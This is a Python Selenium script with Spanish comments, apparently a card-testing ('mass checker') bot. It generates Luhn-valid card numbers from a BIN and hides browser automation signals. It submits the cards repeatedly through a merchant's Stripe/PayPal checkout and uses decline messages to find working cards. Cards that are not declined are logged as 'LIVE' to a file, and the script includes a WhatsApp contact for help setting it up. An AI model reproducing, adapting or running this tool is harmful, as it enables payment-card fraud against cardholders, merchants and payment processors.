from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support import expected_conditions as EC
import time
import random
import pygame
import os
import json


# Ruta al archivo .crx de la extensión
extension_path = 'ext.crx'

# Configurar las opciones del navegador
options = webdriver.ChromeOptions()
options.add_experimental_option("detach", True)
options.add_experimental_option("excludeSwitches", ["enable-automation"])
options.add_experimental_option('useAutomationExtension', False)
options.add_argument("--disable-blink-features=AutomationControlled")
options.add_argument('--disable-extensions')
options.add_argument('--no-sandbox')
options.add_argument('--disable-infobars')
options.add_argument('--disable-dev-shm-usage')
options.add_argument('--disable-browser-side-navigation')
options.add_argument('--disable-gpu')

# Agregar la extensión
options.add_extension(extension_path)

# Inicializar el navegador
driver = webdriver.Chrome(options=options)
wait = WebDriverWait(driver, 20)

# Función para generar un número de tarjeta ficticio a partir del BIN
def generate_fake_credit_card(bin):
    card_number = bin + ''.join([str(random.randint(0, 9)) for _ in range(16 - len(bin) - 1)])
    card_number += luhn_check_digit(card_number)
    return card_number

# Función para calcular el dígito de verificación de Luhn
def luhn_check_digit(number):
    total = 0
    for i, digit in enumerate(reversed(number)):
        digit = int(digit)
        if i % 2 == 0:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    return str((10 - (total % 10)) % 10)

# iniciar wbadas
def load_initial_page():
    try:
        print("Cargando página inicial...")
        driver.get('https TU PAGINA ACA')

        ## ACA PONES TODO COMO RELLENEAR PARA LA DIRECCION
        ## Crear cuenta etc

        

        



    except Exception as e:
        print(f"Error al cargar la página inicial y realizar acciones: {str(e)}")
        raise  # Re-lanza la excepción para manejarla fuera de esta función

# Función para ejecutar el bloque deseado
def execute_payment_process():
    try:
        print("Iniciando proceso de pago...")

        driver.refresh()

        #ES RECOMENDABLE REINICIAR EN ESTE execute YA QUE ES EL QUE HACE EL MASSCHEKING Y HACE TODO EL PROCESO MILLONES DE VECES


        wait.until(EC.element_to_be_clickable((By.XPATH, 'ACA TU SIG EXPATH'))).click()

        time.sleep(2)

        driver.switch_to.default_content()
        driver.switch_to.frame(0)
        wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="cardNumber"]')))


        # Obtener el BIN del archivo JSON
        dir_path = os.path.dirname(os.path.realpath(__file__))
        json_path = os.path.join(dir_path, 'media/data.json')

        with open(json_path, 'r') as file:
            data = json.load(file)
        
        # Sustituye 'pest1' con la clave real
        bin_number = data['pest1']["BIN"]

        # Generar número de tarjeta ficticio
        fake_credit_card_number = generate_fake_credit_card(bin_number)






        # Rellenar el número de tarjeta
        first_input = wait.until(EC.presence_of_element_located((By.XPATH, 'ACA PONES TU XPATH DONDE VA LA CC GENERADA')))
        first_input.send_keys(fake_credit_card_number)







        # Obtiene el valor del input (atributo 'value')
        input_valuexd = first_input.get_attribute('value')

        print(input_valuexd)


        # Obtener el BIN del archivo JSON
        dir_path = os.path.dirname(os.path.realpath(__file__))
        json_path = os.path.join(dir_path, 'media/data.json')

        with open(json_path, 'r') as file:
            data = json.load(file)
        
        # Sustituye 'pest1' con la clave real
        bin_date = data['pest1']["Mes"]



    

        wait.until(EC.element_to_be_clickable((By.XPATH, 'ACA TU XPATH DE TU MES, SI TIENE PARA PONES MES Y YEAR POR SEPARADO HABLAME POR PRIVADO : wa.me/+529991226696'))).send_keys(bin_date)





        time.sleep(0.2)

        # Obtener el BIN del archivo JSON
        dir_path = os.path.dirname(os.path.realpath(__file__))
        json_path = os.path.join(dir_path, 'media/data.json')

        with open(json_path, 'r') as file:
            data = json.load(file)
        
        # Sustituye 'pest1' con la clave real
        bin_cvvoranio = data['pest1']["A\u00f1o"]







        # Escribir en el tercer campo (mismo XPath que el segundo)
        third_input = wait.until(EC.presence_of_element_located((By.XPATH, 'ACA VA TU XPATH DE TU CVV')))
        third_input.send_keys(bin_cvvoranio)

        




        time.sleep(0.2)

        # Confirmar la orden
        driver.switch_to.default_content()
        wait.until(EC.element_to_be_clickable((By.XPATH, 'ACA TU XPATH PARA DAR CLICK EN PAGAR'))).click()

        # Función para verificar mensaje de error
        def check_element_text():
            end_time = time.time() + 20  # 20 segundos para verificar
            while time.time() < end_time:
                try:
                    #ACA ES TU XPATH DONDE DA EL CODIGO DE ERROR LA PAGINA
                    element_xpath = '//*[@id="payment-error"]/div/div/ul'
                    element = wait.until(EC.presence_of_element_located((By.XPATH, element_xpath)))
                    element_text = element.text.strip()
                    print(element_text)

                    # Mensajes de error posibles y que si salen reiniciaran la pagina (no debes de poner los errores de live)
                    error_messages = [
                        "The card credentials are invalid",
                        "Authorization error: 'CARD_EXPIRED'",
                        "Your card's security code is incomplete.",
                        "There was an issue with contacting your bank."
                    ]

                    # Verificar si el mensaje de error está presente
                    for error in error_messages:
                        if error in element_text:
                            print(f"Error detectado: {element_text}")
                            return True

                    time.sleep(1)

                except Exception as e:
                    print("ns")
                    wait2 = WebDriverWait(driver, 1)
                    wait2.until(EC.presence_of_element_located((By.XPATH, "Xpathmmon")))


                    pass

            print("No se encontraron mensajes de error en 20 segundos.")
            return False

        # Verificar mensaje de error
        error_detected = check_element_text()

        # Lógica adicional después del proceso de pago
        if error_detected:
            print("Se detectó un error durante el proceso de pago. Manejando situación...")
            # Aquí puedes agregar lógica para manejar errores específicos, como intentar de nuevo, etc.
        else:
            print("Proceso de pago completado con éxito.")
            print("LIVE")
            # Imprime el valor obtenido
            print(input_valuexd)
            if len(input_valuexd) > 16:
                print("LIVE VERIFICADA")

             # Obtén la ruta del directorio del script
            dir_path = os.path.dirname(os.path.realpath(__file__))

            # Construye la ruta absoluta del archivo 'lives.txt'
            live_path = os.path.join(dir_path, 'lives.txt')

            # Guarda los datos en 'lives.txt'
            with open(live_path, 'a') as file:
                file.write(f"{input_valuexd}    {bin_date}    {bin_cvvoranio}    Stripe + Paypal\n")
            
            # Obtén la ruta del directorio del script
            dir_path = os.path.dirname(os.path.realpath(__file__))

            # Construye la ruta absoluta del archivo 'qb.mp3'
            audio_path = os.path.join(dir_path, 'qb.mp3')

            # Inicializa el mixer de pygame
            pygame.mixer.init()

            # Carga y reproduce el archivo de audio
            pygame.mixer.music.load(audio_path)
            pygame.mixer.music.play()

            # Espera a que termine la reproducción
            while pygame.mixer.music.get_busy():
                pygame.time.Clock().tick(10)

                

        driver.refresh()

    except Exception as e:
        print(f"Error durante el proceso de pago: {str(e)}")
        # Manejar cualquier error que pueda ocurrir durante el proceso de pago
        # Reiniciar el proceso
        print("Reiniciando el proceso desde la carga inicial de la página...")
        execute_payment_process()

# Cargar la página inicial y realizar todas las acciones necesarias
load_initial_page()

# Bucle para ejecutar el proceso de pago continuamente
while True:
    execute_payment_process()
    # Aquí puedes agregar lógica adicional después de cada iteración

# Cerrar el navegador al finalizar
driver.quit()


